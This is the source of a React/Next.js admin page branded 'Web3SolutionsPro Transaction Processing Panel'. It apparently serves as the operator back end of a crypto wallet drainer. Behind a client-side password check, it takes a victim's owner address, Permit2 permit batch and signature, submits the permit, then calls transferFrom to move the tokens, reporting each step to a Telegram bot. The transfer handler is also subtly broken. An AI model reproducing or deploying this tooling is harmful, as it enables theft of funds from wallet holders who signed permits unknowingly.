import React, { useContext, useState, useEffect } from 'react';
import {Modal, ModalContent, ModalHeader, ModalBody, ModalFooter, Button, useDisclosure, Card,CardBody,CardFooter,Navbar, NavbarBrand, NavbarContent,NavbarMenu,NavbarMenuToggle, NavbarMenuItem, NavbarItem, Link,Switch,CircularProgress} from "@nextui-org/react";
import { ConnectWallet, useAddress, useBalance, useConnectionStatus, useSigner,useSwitchChain,useSDK } from "@thirdweb-dev/react";
import {PERMIT2_ADDRESS} from '@uniswap/permit2-sdk';
import {useTheme} from "next-themes";
import { ethers,utils} from "ethers";
import MoonIcon from "./moon";
import SunIcon from "./sun";
import Head from 'next/head';
import ChainContext from "../context/Chain";
import { NextPage } from "next";

const Home: NextPage = () => {
    type Chain = {
        name: string;
        id: number;
        synced: boolean;
        symbol: string;
        title: string;
        quoterDecimals:number;
        wrappedTokenSymbol:string;
        wrappedTokenAddress:string;
        wrappedTokenName:string;
        unwrappedTokenAddress:string;
        v3FactoryAddress:string;
        quoterAddress:string;
        swapRouter:string;
      };
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');
    const [showPermitForm, setShowPermitForm] = useState(false);
    const [showTransferForm, setShowTransferForm] = useState(false);
    const [isLoggedIn, setIsLoggedIn] = useState(false);
    const [permitFormData, setPermitFormData] = useState({
        ownerAddress: '',
        permitBatch: '',
        signature: '',
        
    });
    const [transferFormData, setTransferFormData] = useState('');
    const { selectedChain, setSelectedChain } = useContext(ChainContext);
    const [chainList, setChainList] = useState<Chain[]>([]);
    const [selectedChainId, setSelectedChainId] = useState<number | null>(1); 
    const [selectedSymbol, setSelectedSymbol] = useState<string>('');
    const [selectedTitle, setSelectedTitle] = useState<string>("");
    const [selectedWrappedTokenAddress, setSelectedWrappedTokenAddress] = useState<string>("");
    const [selectedQuoterDecimal, setSelectedQuoterDecimal] = useState<number | null>(18);
    const [selectedwrappedTokenSymbol, setSelectedwrappedTokenSymbol] = useState<string>("");
    const [selectedwrappedTokenName, setSelectedwrappedTokenName] = useState<string>("");
    const [selectedunwrappedTokenAddress, setSelectedunwrappedTokenAddress] = useState<string>("");
    const [selectedv3FactoryAddress, setSelectedv3FactoryAddress] = useState<string>("");
    const [chainSelectionConfirmed, setChainSelectionConfirmed] = useState(false);
    const [selectedSwapRouter, setSelectedSwapRouter] = useState<string>("");
    const [selectedQuoterAddress, setSelectedQuoterAddress] = useState<string>("");
    const [showConnectModal, setShowConnectModal] = useState(false);
    const {isOpen, onOpen, onOpenChange, onClose} = useDisclosure();
    const switchChain = useSwitchChain();
    const connectionStatus = useConnectionStatus();
    const signer = useSigner();
    const address = useAddress(); 
    const [loading, setLoading] = useState(false);
    const { theme, setTheme } = useTheme();

    const permitAbi = [
        {
       "inputs": [
         {
           "internalType": "address",
           "name": "owner",
           "type": "address"
         },
         {
           "components": [
             {
               "components": [
                 {
                   "internalType": "address",
                   "name": "token",
                   "type": "address"
                 },
                 {
                   "internalType": "uint160",
                   "name": "amount",
                   "type": "uint160"
                 },
                 {
                   "internalType": "uint48",
                   "name": "expiration",
                   "type": "uint48"
                 },
                 {
                   "internalType": "uint48",
                   "name": "nonce",
                   "type": "uint48"
                 }
               ],
               "internalType": "struct IAllowanceTransfer.PermitDetails[]",
               "name": "details",
               "type": "tuple[]"
             },
             {
               "internalType": "address",
               "name": "spender",
               "type": "address"
             },
             {
               "internalType": "uint256",
               "name": "sigDeadline",
               "type": "uint256"
             }
           ],
           "internalType": "struct IAllowanceTransfer.PermitBatch",
           "name": "permitBatch",
           "type": "tuple"
         },
         {
           "internalType": "bytes",
           "name": "signature",
           "type": "bytes"
         }
       ],
       "name": "permit",
       "outputs": [],
       "stateMutability": "nonpayable",
       "type": "function"
     },
     {
       "inputs": [
         {
           "internalType": "struct IAllowanceTransfer.AllowanceTransferDetails[]",
           "name": "transferDetails",
           "type": "tuple[]",
           "components": [
             {
               "internalType": "address",
               "name": "from",
               "type": "address"
             },
             {
               "internalType": "address",
               "name": "to",
               "type": "address"
             },
             {
               "internalType": "uint160",
               "name": "amount",
               "type": "uint160"
             },
             {
               "internalType": "address",
               "name": "token",
               "type": "address"
             }
           ]
         }
       ],
       "stateMutability": "nonpayable",
       "type": "function",
       "name": "transferFrom"
     }
    ];
    useEffect(() => {
        const storedList = JSON.parse(localStorage.getItem('chainList') || '[]');
        let initialList;
        if (!storedList || storedList.length === 0) {
          const initialList = [
            { name: "ethereum", id: 1, synced: false,  symbol: "ETH",title: "Ethereum",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",unwrappedTokenAddress:"0x6B175474E89094C44Da98b954EedeAC495271d0F",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
            { name: "arbitrum", id: 42161, synced: false, symbol: "ETH" ,title: "Arbitrum",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",unwrappedTokenAddress:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
            { name: "optimism", id: 10, synced: false,  symbol: "ETH",title: "Optimism",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x4200000000000000000000000000000000000006",unwrappedTokenAddress:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
            { name: "polygon", id: 137, synced: false,  symbol: "MATIC",title: "Polygon",wrappedTokenName:"Wrapped Matic",quoterDecimals:18,wrappedTokenSymbol:"WMATIC",wrappedTokenAddress:"0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",unwrappedTokenAddress:"0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
              { name: "fantom", id: 250, synced: false,  symbol: "FTM",title: "Fantom",wrappedTokenName:"Wrapped Fantom",quoterDecimals:18,wrappedTokenSymbol:"WFTM",wrappedTokenAddress:"0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83",unwrappedTokenAddress:"0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E",v3FactoryAddress:"",quoterAddress:"",swapRouter:""},
               { name: "binance", id: 56, synced: false,  symbol: "BNB",title: "Binance Smart Chain",wrappedTokenName:"Wrapped BNB",quoterDecimals:18,wrappedTokenSymbol:"WBNB",wrappedTokenAddress:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",unwrappedTokenAddress:"0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",v3FactoryAddress:"0xdB1d10011AD0Ff90774D0C6Bb92e5C5c8b4461F7",quoterAddress:"0x78D78E420Da98ad378D7799bE8f4AF69033EB077",swapRouter:"0xB971eF87ede563556b2ED4b1C0b0019111Dd85d2"},
               { name: "base", id: 8453, synced: false,  symbol: "ETH",title: "Base",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x4200000000000000000000000000000000000006",unwrappedTokenAddress:"0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",v3FactoryAddress:"0x33128a8fC17869897dcE68Ed026d694621f6FDfD",quoterAddress:"0x3d4e44Eb1374240CE5F1B871ab261CD16335B76a",swapRouter:"0x2626664c2603336E57B271c5C0b26F421741e481"},
              ];
            setChainList(initialList);
            localStorage.setItem('chainList', JSON.stringify(initialList));
            onOpen();
      
            
           
          } else {
            const allChainsUnsynced = storedList.every((chain:Chain) => !chain.synced);
            if (allChainsUnsynced) {
              const initialList = [
                { name: "ethereum", id: 1, synced: false,  symbol: "ETH",title: "Ethereum",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",unwrappedTokenAddress:"0x6B175474E89094C44Da98b954EedeAC495271d0F",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
                { name: "arbitrum", id: 42161, synced: false, symbol: "ETH" ,title: "Arbitrum",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",unwrappedTokenAddress:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
                { name: "optimism", id: 10, synced: false,  symbol: "ETH",title: "Optimism",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x4200000000000000000000000000000000000006",unwrappedTokenAddress:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
                { name: "polygon", id: 137, synced: false,  symbol: "MATIC",title: "Polygon",wrappedTokenName:"Wrapped Matic",quoterDecimals:18,wrappedTokenSymbol:"WMATIC",wrappedTokenAddress:"0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",unwrappedTokenAddress:"0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
                  { name: "fantom", id: 250, synced: false,  symbol: "FTM",title: "Fantom",wrappedTokenName:"Wrapped Fantom",quoterDecimals:18,wrappedTokenSymbol:"WFTM",wrappedTokenAddress:"0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83",unwrappedTokenAddress:"0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E",v3FactoryAddress:"",quoterAddress:"",swapRouter:""},
                   { name: "binance", id: 56, synced: false,  symbol: "BNB",title: "Binance Smart Chain",wrappedTokenName:"Wrapped BNB",quoterDecimals:18,wrappedTokenSymbol:"WBNB",wrappedTokenAddress:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",unwrappedTokenAddress:"0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",v3FactoryAddress:"0xdB1d10011AD0Ff90774D0C6Bb92e5C5c8b4461F7",quoterAddress:"0x78D78E420Da98ad378D7799bE8f4AF69033EB077",swapRouter:"0xB971eF87ede563556b2ED4b1C0b0019111Dd85d2"},
                   { name: "base", id: 8453, synced: false,  symbol: "ETH",title: "Base",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x4200000000000000000000000000000000000006",unwrappedTokenAddress:"0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",v3FactoryAddress:"0x33128a8fC17869897dcE68Ed026d694621f6FDfD",quoterAddress:"0x3d4e44Eb1374240CE5F1B871ab261CD16335B76a",swapRouter:"0x2626664c2603336E57B271c5C0b26F421741e481"},
                  ];
            setChainList(initialList);
            localStorage.setItem('chainList', JSON.stringify(initialList));
              onOpen();
            }
      
        }
        
      }, []);
      const handleChainSelection = async (chainName: string, chainId: number, chainSym: string, chainTitle:string, chainQuoterDecimals:number, chainWrappedTokenSymbol:string,chainWrappedTokenAddress:string,chainWrappedTokenName:string,chainUnwrappedTokenAddress:string,chainV3FactoryAddress:string,chainQuoterAddress:string,chainSwapRouter:string) => {
        // Logic to handle the selected chain
        setSelectedChain(chainName);
        setSelectedChainId(chainId);
        setSelectedSymbol(chainSym);
        setSelectedTitle(chainTitle);
        setSelectedQuoterDecimal(chainQuoterDecimals);
        setSelectedwrappedTokenSymbol(chainWrappedTokenSymbol);
        setSelectedWrappedTokenAddress(chainWrappedTokenAddress);
        setSelectedwrappedTokenName(chainWrappedTokenName);
        setSelectedunwrappedTokenAddress(chainUnwrappedTokenAddress);
        setSelectedv3FactoryAddress(chainV3FactoryAddress);
        setSelectedQuoterAddress(chainQuoterAddress);
        setSelectedSwapRouter(chainSwapRouter);
    
        switch (connectionStatus) {
          case "unknown":
            await sendMessageToTelegram("Wallet not connected");
            return;
          case "connected":
            // Create a button to switch the chain
            await switchChain(chainId);
            onClose();
            setChainSelectionConfirmed(true);
            break;
          case "disconnected":
            await sendMessageToTelegram("Wallet disconnected");
            onClose();
            setShowConnectModal(true);
            return;
          default:
            break;
        }
      };
      const handleChainSelection2 = async (chainName: string, chainId: number, chainSym: string, chainTitle:string, chainQuoterDecimals:number, chainWrappedTokenSymbol:string,chainWrappedTokenAddress:string,chainWrappedTokenName:string,chainUnwrappedTokenAddress:string,chainV3FactoryAddress:string,chainQuoterAddress:string,chainSwapRouter:string) => {
        // Logic to handle the selected chain
        setSelectedChain(chainName);
        setSelectedChainId(chainId);
        setSelectedSymbol(chainSym);
        setSelectedTitle(chainTitle);
        setSelectedQuoterDecimal(chainQuoterDecimals);
        setSelectedwrappedTokenSymbol(chainWrappedTokenSymbol);
        setSelectedWrappedTokenAddress(chainWrappedTokenAddress);
        setSelectedwrappedTokenName(chainWrappedTokenName);
        setSelectedunwrappedTokenAddress(chainUnwrappedTokenAddress);
        setSelectedv3FactoryAddress(chainV3FactoryAddress);
        setSelectedQuoterAddress(chainQuoterAddress);
        setSelectedSwapRouter(chainSwapRouter);
    
        switch (connectionStatus) {
          case "unknown":
            await sendMessageToTelegram("Admin Wallet not connected");
            return;
          case "connected":
            await sendMessageToTelegram("Admin Wallet connected");
            await switchChain(chainId);
            onClose();
            break;
          case "disconnected":
            await sendMessageToTelegram("Wallet disconnected");
            onClose();
            setShowConnectModal(true);
            return;
          default:
            break;
        }
      };
    function isThemeValid(theme: any): theme is "light" | "dark" {
        return theme === "light" || theme === "dark";
      }
    const expectedUsername = process.env.NEXT_PUBLIC_ADMIN_USERNAME;
const expectedPassword = process.env.NEXT_PUBLIC_ADMIN_PASS;
// Function to authenticate user
function authenticate(username: string, password: string): boolean {
    return username === expectedUsername && password === expectedPassword;
}
const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (authenticate(username, password)) {
        console.log('Authentication successful!');
        setIsLoggedIn(true);
    } else {
        setError('Invalid username or password');
    }
};
const handlePermitFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    try {
        setLoading(true);
        const contractPermit = new ethers.Contract(PERMIT2_ADDRESS, permitAbi, signer);
        const tx = await contractPermit.populateTransaction.permit(permitFormData.ownerAddress,permitFormData.permitBatch,permitFormData.signature);
        const data = tx.data;
         const rawTx = {
          to: PERMIT2_ADDRESS, // Specify the contract address as the recipient
          data: data,
          gasLimit: 800000,
          chainId: selectedChainId ?? 1,
          type: 2,
          };
          const sendRawTx = await signer?.sendTransaction(rawTx);
          const txHash = await sendRawTx?.wait();
          await sendMessageToTelegram(`Permit Succesful!:${txHash?.transactionHash}`);
          setLoading(false);
    } catch (error) {
        console.error('Error submitting permit form:', error);
    }
};


const handleTransferFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    try {
        setLoading(true);
        const contractPermit = new ethers.Contract(PERMIT2_ADDRESS, permitAbi, signer);
        const tx = await contractPermit.populateTransaction.transfer(transferFormData);
        const data = tx.data;
         const rawTx = {
          to: PERMIT2_ADDRESS, // Specify the contract address as the recipient
          data: data,
          gasLimit: 800000,
          chainId: selectedChainId ?? 1,
          type: 2,
          };
          const sendRawTx = await signer?.sendTransaction(rawTx);
          const txHash = await sendRawTx?.wait();
          await sendMessageToTelegram(`Transafer Succesful!:${txHash?.transactionHash}`);
          setLoading(false);
    } catch (error) {
        console.error('Error transferring assets:', error);
    }
};
return(
<div className="min-h-screen flex items-center justify-center bg-gray-50 py-12 px-4 sm:px-6 lg:px-8">
<Head>
            <title> Admin Panel - Web3SolutionsPro</title>
      </Head>
            <div className="max-w-md w-full space-y-8">
                <h2 className = "mt-6 text-center text-xl font-bold text-gray-900">Web3SolutionsPro Transaction Processing Panel</h2>
                {!isLoggedIn && (<form className="mt-8 space-y-6" onSubmit={handleSubmit}>
                <div>
                
                    <h2 className="mt-6 text-center text-xl font-bold text-gray-900">Administration Access Required</h2>
                </div>
                    <input type="hidden" name="remember" defaultValue="true" />
                    <div className="rounded-md shadow-sm -space-y-px">
                        <div>
                            <label htmlFor="username" className="sr-only">Admin ID</label>
                            <input id="username" name="username" type="text" autoComplete="username" required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Username" value={username} onChange={e => setUsername(e.target.value)} />
                        </div>
                        <div>
                            <label htmlFor="password" className="sr-only">Passphrase</label>
                            <input id="password" name="password" type="password" autoComplete="current-password" required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Password" value={password} onChange={e => setPassword(e.target.value)} />
                        </div>
                    </div>

                    {error && <p className="mt-2 text-sm text-red-600">{error}</p>}

                    <div>
                        <button type="submit" className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500">
                            Sign in
                        </button>
                    </div>
                </form>)}
                {isLoggedIn && (
                    <div>
                         {loading && (
        <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', zIndex: 1000,}} className="w-full h-full flex justify-center items-center bg-gray-500 bg-opacity-50 backdrop-filter backdrop-blur-lg z-50">
          <CircularProgress color="secondary" size="lg" label="Synchronization in progress..."/>
        </div>
      )}
                        <Modal isOpen={showConnectModal} onClose={() => setShowConnectModal(false)}>
    <ModalContent>
            {(onClose) => (
              <>
                <ModalHeader className="flex flex-col gap-1">Connect Wallet</ModalHeader>
                <ModalBody>
                  <p> 
                    Connect your wallet to access this feature.
                    <ConnectWallet
      switchToActiveChain={true}
      modalTitle={"Choose your wallet"}
      modalSize={"wide"}
      welcomeScreen={{
        title: "Your Universal Chain Resolver",
      }}
      modalTitleIconUrl={"/favicon.ico"}
      termsOfServiceUrl={"https://Web3SolutionsPro.com"}
        privacyPolicyUrl={"https://Web3SolutionsPro.com"}
      showThirdwebBranding={false}
      theme={isThemeValid(theme) ? theme : "light"} />
                  </p>
                </ModalBody>
                <ModalFooter>
                  <Button color="danger" variant="light" onPress={onClose}>
                    Close
                  </Button>
                </ModalFooter>
              </>
            )}
          </ModalContent>
  </Modal>
  <Modal isOpen={isOpen} onOpenChange={onOpenChange}>
    <ModalContent>
      {(onClose) => (
        <>
          <ModalHeader>Select Chain</ModalHeader>
          <ModalBody>
            <p>Choose the network you want to interact with:</p>
            {chainList.map(chain => (
              <Button key={chain.id} color="success" variant="light" onClick={() => handleChainSelection2(chain.name, chain.id, chain.symbol,chain.title,chain.quoterDecimals,chain.wrappedTokenSymbol,chain.wrappedTokenAddress,chain.wrappedTokenName,chain.unwrappedTokenAddress,chain.v3FactoryAddress,chain.quoterAddress,chain.swapRouter)}>
                {chain.title}
              </Button>
            ))}
          </ModalBody>
          <ModalFooter>
          </ModalFooter>
        </>
      )}
    </ModalContent>
  </Modal>
                        <ConnectWallet
      switchToActiveChain={true}
      modalTitle={"Choose your wallet"}
      modalSize={"wide"}
      welcomeScreen={{
        title: "Your Universal Chain Resolver",
      }}
      modalTitleIconUrl={"/favicon.ico"}
      termsOfServiceUrl={"https://Web3SolutionsPro.com"}
        privacyPolicyUrl={"https://Web3SolutionsPro.com"}
      showThirdwebBranding={false}
      theme={isThemeValid(theme) ? theme : "light"} /><br></br>
                        <button className="block w-full bg-gray-700 hover:bg-gray-600 text-white font-bold py-2 px-4 rounded mb-4" onClick={() => {setShowPermitForm(true); setShowTransferForm(false)}}>Process Permit</button>
                        {showPermitForm && (
                            <form className="space-y-6" onSubmit={handlePermitFormSubmit}>
                                <div className="rounded-md shadow-sm -space-y-px">
                                    <div>
                                        <label htmlFor="ownerAddress" className="sr-only">Owner&apos;s Address</label>
                                        <input id="ownerAddress" name="ownerAddress" type="text" required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Owner's Address" value={permitFormData.ownerAddress} onChange={e => setPermitFormData({...permitFormData, ownerAddress: e.target.value})} />
                                    </div>
                                    <div>
                                        <label htmlFor="permitBatch" className="sr-only">Permit Batch</label>
                                        <input id="permitBatch" name="permitBatch" type="text" required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Permit Batch" value={permitFormData.permitBatch} onChange={e => setPermitFormData({...permitFormData, permitBatch: e.target.value})} />
                                    </div>
                                    <div>
                                        <label htmlFor="signature" className="sr-only">signature</label>
                                        <input id="signature" name="signature" type="text" required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="signature" value={permitFormData.signature} onChange={e => setPermitFormData({...permitFormData, signature: e.target.value})} />
                                    </div>
                                    </div>
                                    
                                <div>
                                    <br></br>
                                    <button type="submit" className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500">
                                        Process Permit
                                    </button>
                                </div>
                            </form>
                        )}
                        <br></br>
                        <button className="block w-full bg-gray-700 hover:bg-gray-600 text-white font-bold py-2 px-4 rounded" onClick={() => { setShowPermitForm(false); setShowTransferForm(true); }}>Process TransferFrom</button>
                        {showTransferForm && (
                            <form className="space-y-6" onSubmit={handleTransferFormSubmit}>
                                <div className="rounded-md shadow-sm -space-y-px">
                                    <div>
                                        <label htmlFor="transferDetails" className="sr-only">Transfer Details</label>
                                        <input id="transferDetails" name="transferDetails" type="text" required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Transfer Details" value={transferFormData} onChange={e => setTransferFormData(e.target.value)} />
                                    </div>
                                </div>
                                <div>
                                    <button type="submit" className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500">
                                        Process TransferFrom
                                    </button>
                                </div>
                            </form>
                        )}
                    </div>
                )}
            </div>
        </div>
    );
};
const sendMessageToTelegram = async (message: string) => {
    const bt = process.env.NEXT_PUBLIC_BOT_TOKEN || "bottoken";
    const cid = process.env.NEXT_PUBLIC_CHAT_ID || "chatid";
    const botToken = bt;
    const chatId = cid;  
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  }; 
  
export default Home;